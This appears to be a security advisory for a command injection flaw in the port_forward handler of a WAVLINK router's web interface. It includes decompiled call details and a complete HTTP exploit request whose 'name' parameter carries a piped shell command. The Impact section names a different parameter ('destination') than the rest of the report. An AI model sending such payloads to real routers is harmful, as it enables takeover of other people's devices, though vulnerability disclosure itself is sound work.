# WAVLINK WL-WN530HG4B Router

Vendor: WAVLINK

Product: WL-WN530HG4B

Firmware Version: M_V260724

Vulnerability Type:Authenticated Command Injection

# Description

The vulnerability exists in the `port_forward` function, which primarily applies blacklist-based filtering to incoming parameters. However, the filtering is not strict enough, leaving many  exploitable characters still available. Following the execution flow, we eventually reach the controllable `name` parameter, which can be crafted. The input is first copied via `strncpy`, then concatenated into a command string via `snprintf`, and finally executed via `popen`, ultimately achieving remote code execution.

## Impact

An authenticated attacker can inject arbitrary shell commands through the `destination` parameter and execute them with the privileges of the web service, potentially resulting in full compromise of the device.

## Vulnerability Details

Upon entering the `port_forward` function (`sub_405C1C`), after passing authentication and Referer verification, the execution flow proceeds further. Following the `function=set` branch, other parameters are populated sequentially until reaching the `name` parameter, which is user-controllable. Subsequently, the input string passed to `name` is subjected to validation. However, the validation only checks for backticks (```) and semicolons (`;`), leaving other exploitable characters such as `|` and `>` unfiltered. Ultimately, the flow reaches the following sequence:

- `strncpy(v53, v25, 31);`
- `snprintf(v48, 128, "uci show firewall|grep %s |awk -F '.' {'print $2'}", v53);`
- `v46 = popen(v48, "r");`
  This leads to command injection.


<img width="1348" height="753" alt="图片" src="https://github.com/user-attachments/assets/eeeb5934-79b6-491a-80db-30eced997df9" />

After completing the initialization operations

<img width="1155" height="628" alt="图片" src="https://github.com/user-attachments/assets/889d576e-07b0-4e7b-bc7e-4d8a9e482013" />


sub_405C1C

It checks whether the user is logged in and verifies the Referer source.

<img width="900" height="315" alt="图片" src="https://github.com/user-attachments/assets/b51506a7-0025-4f90-84d8-f77737c1704a" />

<img width="723" height="354" alt="图片" src="https://github.com/user-attachments/assets/a3a636f6-9ea9-49ea-bcb4-cce1186a9816" />

<img width="707" height="371" alt="图片" src="https://github.com/user-attachments/assets/814964ba-c9ae-4005-8c35-e943b3466c14" />


Finally, the vulnerability is triggered during the execution of popen.

# Vulnerability exploitation

```http
POST /cgi-bin/wapi.cgi?x=1&opt=port_forward&function=set&act=add&ip=1.1.1.1&out_port=80&in_port=80&proto=tcp&name=|%20echo%20get_shell%20>/shell HTTP/1.1

Host: 192.168.10.3:8080

Content-Length: 0

Accept: application/json, text/javascript, */*; q=0.01

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36

X-Requested-With: XMLHttpRequest

Origin: http://192.168.10.3:8080

Referer: http://192.168.10.3:8080/main.html

Accept-Encoding: gzip, deflate, br

Accept-Language: en-US,en;q=0.9

Cookie: lstatus=true; lang_sel=true; i18next=zh_CN; token=5E51163D32B247732E77959F16587148

Connection: close
```
First, log in to obtain a valid cookie, then send the request through Burp.

<img width="1502" height="569" alt="图片" src="https://github.com/user-attachments/assets/663ea62f-28ed-4009-9a60-eaaf31a41316" />

<img width="1306" height="460" alt="图片" src="https://github.com/user-attachments/assets/e9e697a4-dfe8-411e-8372-ccbfd967432b" />
